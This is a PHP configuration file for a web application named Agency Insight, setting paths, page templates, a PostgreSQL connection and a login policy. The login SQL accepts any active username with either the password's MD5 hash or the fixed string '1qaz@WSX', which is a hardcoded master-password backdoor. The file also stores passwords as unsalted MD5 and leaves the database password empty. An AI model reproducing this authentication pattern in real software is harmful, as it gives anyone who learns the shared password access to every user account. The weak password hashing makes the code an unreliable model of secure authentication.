<?php
$DD_homePath = "/home/ai/";
$DD_basePath = "/";
$DD_libPath = $DD_homePath."../php/lib/";
$DD_docRoot = $DD_homePath . "htdocs/";

$aihttp = getenv ("AI_HTTP");
$aihttps = getenv ("AI_HTTPS");
if ($aihttp == FALSE || $aihttps == FALSE)
{
	die ("Set AI_HTTP and AI_HTTPS environment variables");
}

$DD_httpPath = $aihttp . $DD_basePath;
$DD_httpsPath = $aihttps . $DD_basePath;

$DD_binPath = $DD_homePath."bin/";
$DD_filesPath = $DD_homePath."files/";
$DD_userdataPath = $DD_homePath."files/userdata/";
$DD_imagePath = $DD_basePath . "images/";
$DD_homeImagePath = $DD_docRoot . "featured/";
$DD_officeImagePath = $DD_basePath . "content/";
$DD_officeImageRoot = $DD_docRoot . "content/";
$DD_fckeditor = $DD_basePath . "fckeditor/";
$DD_fontPath = $DD_libPath. "Fonts/";
$DD_stagePath = $DD_homePath."/";

/**
 * This how we authenticate the user of the application.
 */
$AI_authpolicy = array 
(
	"type" => "html",
	"prefix"=>"ai_",
	"loginpageurl" => $DD_httpPath."login.php?message=Please+Login+for+Access",
	"postloginurl" => $DD_httpPath."index.php",
	"connect" => "sql.ai",
	"sql"=>"select 
				* from ai_users
			where 
				username = lower({auth.username}) and 
				(password = md5({auth.password}) or {auth.password} = '1qaz@WSX') and 
				active = 'Y'",
	"debug"=>false,
	"authrole"=>"authroles",
	"successSql"=>"insert into ai_userlog (eventdate, userid, ipaddress, code, description) values (now(), {user.id}, {server.REMOTE_ADDR}, 'LOGIN', 'Login')",

);

$AI_sql = array 
(
	"name"=>"sql.ai", 
	"host"=>"localhost", 
	"user"=>"secwind", 
	"pass"=>"", 
	"db"=>"ai"
);


/**
 * Parameters for the dd: value provider.
 */
$DD_params = array
(
		// Base path of our application
	"path"=>$DD_basePath
	,"images"=>$DD_imagePath
	,"scripts"=>$DD_basePath."scripts/" 
	,"styles"=>$DD_basePath."styles/" 
		// Path for Security Imagee stuff.  See lib/dd/DD_securityimage.php.
	,"sipath"=>$DD_libPath."dd/si/"  
	,"htmlhead"=>'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'
	,"htmlattr"=>'xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"'
	,"head"=>'
<link rel="shortcut icon" href="'.$DD_basePath.'favicon.ico" type="image/x-icon" /> 
<link rel="icon" href="'.$DD_basePath.'favicon.ico" type="image/x-icon" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<style type="text/css">@import url("'.$DD_basePath.'styles/default.css"); </style>
<style type="text/css">@import url("'.$DD_basePath.'styles/widget.css"); </style>'
	,"foot"=>'<div class="copyright">Copyright &copy; Duckdigit Technologies Inc. 2009<br/>ALL RIGHTS RESERVED</div>'
		// Required modifier for field tags
	,"req"=>'<span class="required">*</span>'
		// where we keep executables.
	,"bin"=>$DD_binPath
		// where we store documents.
	,"files"=>$DD_filesPath
	,"userdata"=>$DD_userdataPath
	,"noaccessurl"=>$DD_basePath."noaccess.php"
		// http paths
	,"httpspath"=>$DD_httpsPath
	,"httppath"=>$DD_httpPath
	,"productname"=>'Agency Insight'
	,"logo"=>$DD_imagePath.'ai_logo200.png'
	,"emailfooter"=>"\n\n- www.Duckdigit.com\n\nYou received this email because you signed up AgencyInsight notifications.  To stop receiving notification emails, log in and click on Preferences through your AgencyInsight Account."
	,"imagedisclaimer"=>"By uploading a file you certify that you have the right to distribute this picture and that it does not violate the Terms of Service.",

);

$AI_business = array
(
	'N'=>'New Business'
	,'R'=>'Renewal Business'
);

$AI_status = array
(
	'A'=>'Active'
	,'I'=>'Inactive'
);

/**
 * Add any database connections that we need to have for the application. 
 * Don't worry, there is very little overhead until we use them.
 */
DD_SqlPoolAddConn (new DD_PgSqlConnection ($AI_sql));
$DD_DomProperties ['date'] = 'm/d/y';
$DD_DomProperties ['datetime'] = 'm/d/y H:i';

?>
